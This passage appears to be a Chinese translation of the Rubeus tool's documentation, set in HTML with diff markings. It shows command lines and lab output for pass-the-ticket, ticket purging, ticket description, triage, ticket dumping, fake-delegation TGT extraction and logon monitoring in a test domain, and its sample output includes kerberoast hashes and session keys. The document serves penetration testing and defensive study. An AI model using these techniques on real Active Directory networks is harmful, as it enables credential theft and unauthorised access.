+LogonServer              : PRIMARY
+LogonServerDNSDomain     : TESTLAB.LOCAL
+UserPrincipalName        : patsy@testlab.local
+
+    [0] - 0x12 - aes256_cts_hmac_sha1
+    Start/End/MaxRenew: 2/11/2019 2:58:53 PM ; 2/11/2019 7:58:53 PM ; 2/18/2019 2:58:53 PM
+    Server Name       : krbtgt/TESTLAB.LOCAL @ TESTLAB.LOCAL
+    Client Name       : patsy @ TESTLAB.LOCAL
+    Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)
+
+
+C:\Rubeus&gt;Rubeus.exe ptt /luid:0x474722b /ticket:doIFmjCCBZagAwIBBaEDAgEWoo..(snip)..
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+[*] Action: Import Ticket
+[*] Target LUID: 0x474722b
+[+] Ticket successfully imported!
+
+C:\Rubeus&gt;Rubeus.exe klist /luid:0x474722b
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+
+[*] Action: List Kerberos Tickets (All Users)
+
+[*] Target LUID     : 0x474722b
+
+UserName                 : patsy
+Domain                   : TESTLAB
+LogonId                  : 0x474722b
+UserSID                  : S-1-5-21-883232822-274137685-4173207997-1169
+AuthenticationPackage    : Kerberos
+LogonType                : Interactive
+LogonTime                : 2/11/2019 10:58:53 PM
+LogonServer              : PRIMARY
+LogonServerDNSDomain     : TESTLAB.LOCAL
+UserPrincipalName        : patsy@testlab.local
+
+    [0] - 0x12 - aes256_cts_hmac_sha1
+    Start/End/MaxRenew: 2/11/2019 2:55:18 PM ; 2/11/2019 7:55:18 PM ; 2/18/2019 2:55:18 PM
+    Server Name       : krbtgt/testlab.local @ TESTLAB.LOCAL
+    Client Name       : dfm.a @ TESTLAB.LOCAL
+    Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)</code></pre>
+<h3 id="purge"><a href="#purge" class="headerlink" title="purge"></a>purge</h3><p><strong>purge</strong> 操作将清除当前登录会话中的所有 Kerberos 票据，或者通过 <code>/luid:0xA..</code> 参数指定登录会话 ID。（需要管理员权限）</p>
+<p>此操作的功能和 Mimikatz / Kekeo 的 <strong>Kerberos::purge</strong> 函数或 Cobalt Strike 的 <strong>kerberos_ticket_purge</strong> 功能相同。</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe klist
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+
+[*] Action: List Kerberos Tickets (Current User)
+
+    [0] - 0x12 - aes256_cts_hmac_sha1
+    Start/End/MaxRenew: 2/11/2019 3:05:36 PM ; 2/11/2019 8:05:36 PM ; 2/18/2019 3:05:36 PM
+    Server Name       : krbtgt/TESTLAB.LOCAL @ TESTLAB.LOCAL
+    Client Name       : harmj0y @ TESTLAB.LOCAL
+    Flags             : name_canonicalize, pre_authent, renewable, forwarded, forwardable (60a10000)
+
+    [1] - 0x12 - aes256_cts_hmac_sha1
+    Start/End/MaxRenew: 2/11/2019 3:05:36 PM ; 2/11/2019 8:05:36 PM ; 2/18/2019 3:05:36 PM
+    Server Name       : krbtgt/TESTLAB.LOCAL @ TESTLAB.LOCAL
+    Client Name       : harmj0y @ TESTLAB.LOCAL
+    Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)
+
+    [2] - 0x12 - aes256_cts_hmac_sha1
+    Start/End/MaxRenew: 2/11/2019 3:05:36 PM ; 2/11/2019 8:05:36 PM ; 2/18/2019 3:05:36 PM
+    Server Name       : cifs/primary.testlab.local @ TESTLAB.LOCAL
+    Client Name       : harmj0y @ TESTLAB.LOCAL
+    Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)
+
+
+C:\Rubeus&gt;Rubeus.exe purge
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+Luid: 0x0
+
+[*] Action: Purge Tickets
+[+] Tickets successfully purged!
+
+C:\Rubeus&gt;Rubeus.exe klist
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+
+[*] Action: List Kerberos Tickets (Current User)
+
+
+C:\Rubeus&gt;</code></pre>
+<p><strong>已提权的情况下</strong> 清除其他登录会话：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe triage /luid:0x474722b
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+
+[*] Action: Triage Kerberos Tickets
+
+[*] Target LUID     : 0x474722b
+
+-----------------------------------------------------------------------------------
+| LUID      | UserName              | Service              | EndTime              |
+-----------------------------------------------------------------------------------
+| 0x474722b | dfm.a @ TESTLAB.LOCAL | krbtgt/testlab.local | 2/11/2019 7:55:18 PM |
+-----------------------------------------------------------------------------------
+
+
+C:\Rubeus&gt;Rubeus.exe purge /luid:0x474722b
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+Luid: 0x474722b
+
+[*] Action: Purge Tickets
+[*] Target LUID: 0x474722b
+[+] Tickets successfully purged!
+
+C:\Rubeus&gt;Rubeus.exe triage /luid:0x474722b
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+
+[*] Action: Triage Kerberos Tickets
+
+[*] Target LUID     : 0x474722b
+
+---------------------------------------
+| LUID | UserName | Service | EndTime |
+---------------------------------------
+---------------------------------------</code></pre>
+<h3 id="describe"><a href="#describe" class="headerlink" title="describe"></a>describe</h3><p><strong>describe</strong> 操作对 <code>/ticket:X</code> 提供的 TGT 或服务票据进行解析并描述票据的值。与其他 <code>/ticket:X</code> 参数一样，该值可以是 .kirbi 文件的 base64 编码，也可以是磁盘上的 .kirbi 文件的路径。</p>
+<p>如果提供的票据是服务票据，加密类型为 RC4_HMAC，则输出被提取的 kerberoast 兼容 hash。如果提供的服务票据，加密密钥是 AES128/AES256，则会显示警告。如果提供的票据是 TGT，则不会显示 hash 或警告。</p>
+<p>1、显示关于 TGT 的信息：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe describe /ticket:doIFmjCCBZagAwIBBaEDAgEWoo..(snip)..
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+[*] Action: Describe Ticket
+
+UserName              :  dfm.a
+UserRealm             :  TESTLAB.LOCAL
+ServiceName           :  krbtgt/testlab.local
+ServiceRealm          :  TESTLAB.LOCAL
+StartTime             :  2/11/2019 2:55:18 PM
+EndTime               :  2/11/2019 7:55:18 PM
+RenewTill             :  2/18/2019 2:55:18 PM
+Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+KeyType               :  rc4_hmac
+Base64(key)           :  e3MxrlTu9jHh9hG43UfiAQ==</code></pre>
+<p>2、提供一个被提取的 kerberoast hash，显示关于该服务票据的信息</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe describe /ticket:service_ticket.kirbi
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.4.1
+
+
+[*] Action: Describe Ticket
+
+UserName              :  harmj0y
+UserRealm             :  TESTLAB.LOCAL
+ServiceName           :  asdf/asdfasdf
+ServiceRealm          :  TESTLAB.LOCAL
+StartTime             :  2/20/2019 8:58:14 AM
+EndTime               :  2/20/2019 12:41:09 PM
+RenewTill             :  2/27/2019 7:41:09 AM
+Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+KeyType               :  rc4_hmac
+Base64(key)           :  WqGWK4htp7rM1CURpxjMPA==
+Kerberoast Hash       :  $krb5tgs$23$*USER$DOMAIN$asdf/asdfasdf*$DEB467BF9C9023E...(snip)...</code></pre>
+<h2 id="提取和获取票据"><a href="#提取和获取票据" class="headerlink" title="提取和获取票据"></a>提取和获取票据</h2><p>提取/搜集票据命令的类别：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="#triage">triage</a></td>
+<td>LUID, 用户名, 目标服务, 票据到期</td>
+</tr>
+<tr>
+<td><a href="#klist">klist</a></td>
+<td>详细的登录会话和票据信息</td>
+</tr>
+<tr>
+<td><a href="#dump">dump</a></td>
+<td>详细的登录会话和票据数据</td>
+</tr>
+<tr>
+<td><a href="#tgtdeleg">tgtdeleg</a></td>
+<td>为非高权限用户检索可用 TGT</td>
+</tr>
+<tr>
+<td><a href="#monitor">monitor</a></td>
+<td>监控登录事件并导出新票据</td>
+</tr>
+<tr>
+<td><a href="#harvest">harvest</a></td>
+<td>与 monitor 相同，且具有自动续订功能</td>
+</tr>
+</tbody></table>
+<p><strong>Note:</strong> <a href="#triage">triage</a>/<a href="#klist">klist</a>/<a href="#dump">dump</a> give increasing amounts of ticket detail.</p>
+<h3 id="triage"><a href="#triage" class="headerlink" title="triage"></a>triage</h3><p><strong>triage</strong> 操作将输出当前用户的 kerberos 票据的表（如果没有提权）。如果已经提升到管理员权限，输出系统中所有 kerberos 票据。可以使用 <code>/service:SNAME</code> 筛选出特定服务的票据。</p>
+<p>如果已经提权，则可以使用 <code>/luid:0xA..</code> 筛选出特定的 LogonID，或使用 <code>/user:USER</code> 筛选出特定的用户。在对具有大量 kerberos 票据的系统中进行分类时非常有用。</p>
+<p>输出所有可枚举的票据（普通权限）：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe triage
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.4
+
+
+
+[*] Action: Triage Kerberos Tickets (Current User)
+
+[*] Current LUID    : 0x4420e
+
+-----------------------------------------------------------------------------------------
+| LUID    | UserName                | Service                    | EndTime              |
+-----------------------------------------------------------------------------------------
+| 0x4420e | harmj0y @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL       | 2/12/2019 4:04:14 PM |
+| 0x4420e | harmj0y @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL       | 2/12/2019 4:04:14 PM |
+| 0x4420e | harmj0y @ TESTLAB.LOCAL | cifs/primary.testlab.local | 2/12/2019 4:04:14 PM |
+-----------------------------------------------------------------------------------------</code></pre>
+<p>输出所有可枚举的票据（高权限）：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe triage
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.4
+
+
+
+[*] Action: Triage Kerberos Tickets (All Users)
+
+-------------------------------------------------------------------------------------------------------------
+| LUID      | UserName                   | Service                                  | EndTime               |
+-------------------------------------------------------------------------------------------------------------
+| 0x56cdda9 | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 4:04:14 PM  |
+| 0x56cdda9 | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 4:04:14 PM  |
+| 0x56cdda9 | harmj0y @ TESTLAB.LOCAL    | cifs/primary.testlab.local               | 2/12/2019 4:04:14 PM  |
+| 0x56cdd86 | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 4:04:02 PM  |
+| 0x47869cc | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 3:19:11 PM  |
+| 0x47869cc | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 3:19:11 PM  |
+| 0x47869cc | harmj0y @ TESTLAB.LOCAL    | cifs/primary.testlab.local               | 2/12/2019 3:19:11 PM  |
+| 0x47869b4 | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 3:05:29 PM  |
+| 0x3c4c241 | dfm.a @ TESTLAB.LOCAL      | krbtgt/TESTLAB.LOCAL                     | 2/11/2019 4:24:02 AM  |
+| 0x441d8   | dfm.a @ TESTLAB.LOCAL      | cifs/primary.testlab.local               | 2/10/2019 11:41:26 PM |
+| 0x441d8   | dfm.a @ TESTLAB.LOCAL      | LDAP/primary.testlab.local               | 2/10/2019 11:41:26 PM |
+| 0x3e4     | windows10$ @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 1:25:01 PM  |
+| 0x3e4     | windows10$ @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 1:25:01 PM  |
+| 0x3e4     | windows10$ @ TESTLAB.LOCAL | cifs/PRIMARY.testlab.local               | 2/12/2019 1:25:01 PM  |
+| 0x3e4     | windows10$ @ TESTLAB.LOCAL | ldap/primary.testlab.local/testlab.local | 2/11/2019 7:23:48 PM  |
+| 0x3e7     | windows10$ @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 2:23:45 PM  |
+| 0x3e7     | windows10$ @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 2:23:45 PM  |
+| 0x3e7     | windows10$ @ TESTLAB.LOCAL | cifs/PRIMARY.testlab.local/testlab.local | 2/12/2019 2:23:45 PM  |
+| 0x3e7     | windows10$ @ TESTLAB.LOCAL | WINDOWS10$                               | 2/12/2019 2:23:45 PM  |
+| 0x3e7     | windows10$ @ TESTLAB.LOCAL | LDAP/PRIMARY.testlab.local/testlab.local | 2/12/2019 2:23:45 PM  |
+-------------------------------------------------------------------------------------------------------------</code></pre>
+<p>输出特定服务的票据（高权限）：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe triage /service:ldap
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.4
+
+
+
+[*] Action: Triage Kerberos Tickets (All Users)
+
+[*] Target service  : ldap
+
+-----------------------------------------------------------------------------------------------------------
+| LUID    | UserName                   | Service                                  | EndTime               |
+-----------------------------------------------------------------------------------------------------------
+| 0x441d8 | dfm.a @ TESTLAB.LOCAL      | LDAP/primary.testlab.local               | 2/10/2019 11:41:26 PM |
+| 0x3e4   | windows10$ @ TESTLAB.LOCAL | ldap/primary.testlab.local/testlab.local | 2/11/2019 7:23:48 PM  |
+| 0x3e7   | windows10$ @ TESTLAB.LOCAL | LDAP/PRIMARY.testlab.local/testlab.local | 2/12/2019 2:23:45 PM  |
+-----------------------------------------------------------------------------------------------------------</code></pre>
+<h3 id="klist"><a href="#klist" class="headerlink" title="klist"></a>klist</h3><p><strong>klist</strong> 操作将列出 当前用户的登录会话和 kerberos 票据 的详细信息（如果未提权）。如果已经提权，则将显示 所有登录会话和关联的 kerberos 票据的详细信息。可以使用 <code>/luid:0xA..</code> 参数显示特定 LogonID 的登录和票据信息（需要提权后）。</p>
+<p>列出当前用户的登录会话和 kerberos 票据信息（未提权）：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe klist
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.4
+
+
+
+[*] Action: List Kerberos Tickets (Current User)
+
+[*] Current LUID    : 0x4420e
+
+    [0] - 0x12 - aes256_cts_hmac_sha1
+    Start/End/MaxRenew: 2/12/2019 11:04:14 AM ; 2/12/2019 4:04:14 PM ; 2/19/2019 11:04:14 AM
+    Server Name       : krbtgt/TESTLAB.LOCAL @ TESTLAB.LOCAL
+    Client Name       : harmj0y @ TESTLAB.LOCAL
+    Flags             : name_canonicalize, pre_authent, renewable, forwarded, forwardable (60a10000)
+
+    ...(snip)...</code></pre>
+<p><strong>已提权</strong> 列出其他用户的登录会话/kerberos 票据信息：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe klist /luid:0x47869b4
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+
+[*] Action: List Kerberos Tickets (All Users)
+
+[*] Target LUID     : 0x47869b4
+
+UserName                 : harmj0y
+Domain                   : TESTLAB
+LogonId                  : 0x47869b4
+UserSID                  : S-1-5-21-883232822-274137685-4173207997-1111
+AuthenticationPackage    : Kerberos
+LogonType                : Interactive
+LogonTime                : 2/11/2019 11:05:31 PM
+LogonServer              : PRIMARY
+LogonServerDNSDomain     : TESTLAB.LOCAL
+UserPrincipalName        : harmj0y@testlab.local
+
+    [0] - 0x12 - aes256_cts_hmac_sha1
+    Start/End/MaxRenew: 2/11/2019 3:05:31 PM ; 2/11/2019 8:05:31 PM ; 2/18/2019 3:05:31 PM
+    Server Name       : krbtgt/TESTLAB.LOCAL @ TESTLAB.LOCAL
+    Client Name       : harmj0y @ TESTLAB.LOCAL
+    Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)
+
+    ...(snip)...</code></pre>
+<h3 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h3><p><strong>dump</strong> 操作将提取当前的 TGT 和服务票据（如果已提权）。如果未提权，则提取当前用户的服务票据。可以通过 <code>/service</code> 参数（对于 TGT 使用 <code>/service:krbtgt</code>）和/或 logon ID（使用  <code>/luid:0xA..</code> 参数）来筛选提取的票据。KRB-CRED 文件（.kirbis）输出为 base64 blob，可以与 ptt 函数，或者 mimikatz 的 <strong>kerberos::ptt</strong> 功能一起重用。</p>
+<p><strong>注意：</strong> 如果在无特权的上下文中运行，则默认情况下， TGT 的会话密钥不会从关联的 API 返回，因此只有提取的服务票据可用。如果宁想（某种程度上）解决此问题，请使用  <strong>tgtdeleg</strong> 命令。</p>
+<p>提取当前用户的可用服务票据：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe dump
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.4
+
+
+
+[*] Action: Dump Kerberos Ticket Data (Current User)
+
+[*] Current LUID    : 0x4420e
+
+[*] Returned 3 tickets
+
+ServiceName              : krbtgt/TESTLAB.LOCAL
+TargetName               : krbtgt/TESTLAB.LOCAL
+ClientName               : harmj0y
+DomainName               : TESTLAB.LOCAL
+TargetDomainName         : TESTLAB.LOCAL
+AltTargetDomainName      : TESTLAB.LOCAL
+SessionKeyType           : rc4_hmac
+Base64SessionKey         : AAAAAAAAAAAAAAAAAAAAAA==
+KeyExpirationTime        : 12/31/1600 4:00:00 PM
+TicketFlags              : name_canonicalize, pre_authent, renewable, forwarded, forwardable
+StartTime                : 2/11/2019 3:19:15 PM
+EndTime                  : 2/11/2019 8:19:13 PM
+RenewUntil               : 2/18/2019 3:19:13 PM
+TimeSkew                 : 0
+EncodedTicketSize        : 1306
+Base64EncodedTicket      :
+
+    doIFFjCCBRKgAwIBBaEDAgEWoo...(snip)...
+
+...(snip)...
+
+
+
+[*] Enumerated 3 total tickets
+[*] Extracted  3 total tickets</code></pre>
+<p><strong>已提权</strong> 从特定的登录会话中提取票据：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe dump /luid:0x47869cc
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+
+[*] Action: Dump Kerberos Ticket Data (All Users)
+
+[*] Target LUID: 0x47869cc
+
+UserName                 : harmj0y
+Domain                   : TESTLAB
+LogonId                  : 0x47869cc
+UserSID                  : S-1-5-21-883232822-274137685-4173207997-1111
+AuthenticationPackage    : Negotiate
+LogonType                : Interactive
+LogonTime                : 2/11/2019 11:05:31 PM
+LogonServer              : PRIMARY
+LogonServerDNSDomain     : TESTLAB.LOCAL
+UserPrincipalName        : harmj0y@testlab.local
+
+    [*] Enumerated 3 ticket(s):
+
+    ServiceName              : krbtgt/TESTLAB.LOCAL
+    TargetName               : krbtgt/TESTLAB.LOCAL
+    ClientName               : harmj0y
+    DomainName               : TESTLAB.LOCAL
+    TargetDomainName         : TESTLAB.LOCAL
+    AltTargetDomainName      : TESTLAB.LOCAL
+    SessionKeyType           : rc4_hmac
+    Base64SessionKey         : u9DOCzuGKAZB6h/E/9XcFg==
+    KeyExpirationTime        : 12/31/1600 4:00:00 PM
+    TicketFlags              : name_canonicalize, pre_authent, renewable, forwarded, forwardable
+    StartTime                : 2/11/2019 3:21:53 PM
+    EndTime                  : 2/11/2019 8:19:13 PM
+    RenewUntil               : 2/18/2019 3:19:13 PM
+    TimeSkew                 : 0
+    EncodedTicketSize        : 1306
+    Base64EncodedTicket      :
+
+    doIFFjCCBRKgAwIBBaEDAgEWoo...(snip)...
+
+    ServiceName              : krbtgt/TESTLAB.LOCAL
+    TargetName               : krbtgt/TESTLAB.LOCAL
+    ClientName               : harmj0y
+    DomainName               : TESTLAB.LOCAL
+    TargetDomainName         : TESTLAB.LOCAL
+    AltTargetDomainName      : TESTLAB.LOCAL
+    SessionKeyType           : aes256_cts_hmac_sha1
+    Base64SessionKey         : tKcszT8rdYyxBxBHlkpmJ/SEsfON8mBMs4ZN/29Xv8A=
+    KeyExpirationTime        : 12/31/1600 4:00:00 PM
+    TicketFlags              : name_canonicalize, pre_authent, initial, renewable, forwardable
+    StartTime                : 2/11/2019 3:19:13 PM
+    EndTime                  : 2/11/2019 8:19:13 PM
+    RenewUntil               : 2/18/2019 3:19:13 PM
+    TimeSkew                 : 0
+    EncodedTicketSize        : 1338
+    Base64EncodedTicket      :
+
+    doIFNjCCBTKgAwIBBaEDAgEWoo...(snip)...
+
+    ...(snip)...
+
+
+[*] Enumerated 3 total tickets
+[*] Extracted  3 total tickets</code></pre>
+<p><strong>已提权</strong> 提取系统中所有的 TGT：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe dump /service:krbtgt
+
+ ______        _                      
+(_____ \      | |                     
+ _____) )_   _| |__  _____ _   _  ___ 
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+
+[*] Action: Dump Kerberos Ticket Data (All Users)
+
+[*] Target service  : krbtgt
+
+
+UserName                 : harmj0y
+Domain                   : TESTLAB
+LogonId                  : 0x47869cc
+UserSID                  : S-1-5-21-883232822-274137685-4173207997-1111
+AuthenticationPackage    : Negotiate
+LogonType                : Interactive
+LogonTime                : 2/11/2019 11:05:31 PM
+LogonServer              : PRIMARY
+LogonServerDNSDomain     : TESTLAB.LOCAL
+UserPrincipalName        : harmj0y@testlab.local
+
+    [*] Enumerated 3 ticket(s):
+
+    ServiceName              : krbtgt/TESTLAB.LOCAL
+    TargetName               : krbtgt/TESTLAB.LOCAL
+    ClientName               : harmj0y
+    DomainName               : TESTLAB.LOCAL
+    TargetDomainName         : TESTLAB.LOCAL
+    AltTargetDomainName      : TESTLAB.LOCAL
+    SessionKeyType           : rc4_hmac
+    Base64SessionKey         : y4LL+W3KZoOjnwsiwf150g==
+    KeyExpirationTime        : 12/31/1600 4:00:00 PM
+    TicketFlags              : name_canonicalize, pre_authent, renewable, forwarded, forwardable
+    StartTime                : 2/11/2019 3:23:50 PM
+    EndTime                  : 2/11/2019 8:19:13 PM
+    RenewUntil               : 2/18/2019 3:19:13 PM
+    TimeSkew                 : 0
+    EncodedTicketSize        : 1306
+    Base64EncodedTicket      :
+
+    doIFFjCCBRKgAwIBBaEDAgEWoo...(snip)...
+
+    ...(snip)...
+
+UserName                 : WINDOWS10$
+Domain                   : TESTLAB
+LogonId                  : 0x3e4
+UserSID                  : S-1-5-20
+AuthenticationPackage    : Negotiate
+LogonType                : Service
+LogonTime                : 2/7/2019 4:51:20 PM
+LogonServer              : 
+LogonServerDNSDomain     : testlab.local
+UserPrincipalName        : WINDOWS10$@testlab.local
+
+    [*] Enumerated 4 ticket(s):
+
+    ServiceName              : krbtgt/TESTLAB.LOCAL
+    TargetName               : krbtgt/TESTLAB.LOCAL
+    ClientName               : WINDOWS10$
+    DomainName               : TESTLAB.LOCAL
+    TargetDomainName         : TESTLAB.LOCAL
+    AltTargetDomainName      : TESTLAB.LOCAL
+    SessionKeyType           : rc4_hmac
+    Base64SessionKey         : 0NgsSyZ/XOCTi9wLR1z9Kg==
+    KeyExpirationTime        : 12/31/1600 4:00:00 PM
+    TicketFlags              : name_canonicalize, pre_authent, renewable, forwarded, forwardable
+    StartTime                : 2/11/2019 3:23:50 PM
+    EndTime                  : 2/11/2019 7:23:48 PM
+    RenewUntil               : 2/18/2019 2:23:48 PM
+    TimeSkew                 : 0
+    EncodedTicketSize        : 1304
+    Base64EncodedTicket      :
+
+    doIFFDCCBRCgAwIBBaEDAgEWoo...(snip)...
+
+    ...(snip)...
+
+
+[*] Enumerated 20 total tickets
+[*] Extracted  9 total tickets</code></pre>
+<h3 id="tgtdeleg"><a href="#tgtdeleg" class="headerlink" title="tgtdeleg"></a>tgtdeleg</h3><p><strong>tgtdeleg</strong> 函数 使用 <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo/">Kekeo</a> 技巧（<strong>tgt::deleg</strong>），滥用 kerberos GSS-API 来为当前用户检索可用的 TGT，而无需在主机上提升权限。AcquireCredentialsHandle() 用于获取当前用户的 kerberos 安全凭证的句柄，并使用带有 ISC_REQ_DELEGATE 标志和一个目标 SPN（HOST/DC.domain.com）的 InitializeSecurityContext() 调用来准备一个假的委托上下文来发送给域控制器。这将导致 GSS-API 输出中的 AP-REQ，其中包含认证器中的 KRB_CRED 校验和。服务票据的会话密钥会从本地 kerberos 缓存中提取出来，并用于解密认证器中的 KRB_CRED，从而得到一个可用的 TGT .kirbi。</p>
+<p>如果自动 目标/域 提权失败，则可以使用 <code>/target:SPN</code> 来指定配置了不受限委派的服务的 SPN。</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe tgtdeleg
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+[*] Action: Request Fake Delegation TGT (current user)
+
+[*] No target SPN specified, attempting to build &#39;HOST/dc.domain.com&#39;
+[*] Initializing Kerberos GSS-API w/ fake delegation for target &#39;HOST/PRIMARY.testlab.local&#39;
+[+] Kerberos GSS-API initialization success!
+[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
+[*] Found the AP-REQ delegation ticket in the GSS-API output.
+[*] Authenticator etype: aes256_cts_hmac_sha1
+[*] Extracted the service ticket session key from the ticket cache: YnEFxPfqw3LdfNvLtdFfzaFf7zG3hG+HNjesy+6R+ys=
+[+] Successfully decrypted the authenticator
+[*] base64(ticket.kirbi):
+
+    doIFNjCCBTKgAwIBBaEDAgEWoo...(snip)...</code></pre>
+<h3 id="monitor"><a href="#monitor" class="headerlink" title="monitor"></a>monitor</h3><p><strong>monitor</strong> 函数 将每隔 <code>/monitorinterval:X</code> 秒（默认 60 秒）定期获取所有 TGT，并显示任何新捕获到的 TGT。可以指定 <code>/targetuser:USER</code>，只返回该用户的票据数据。这个功能在启用了不受限委派的服务器上特别有用。</p>
+<p>当 <code>/targetuser:USER</code>（或者如果没有指定，则为任何用户）创建一个新的 4624 登录事件时，任何提取的 TGT KRB-CRED 数据都会被输出。</p>
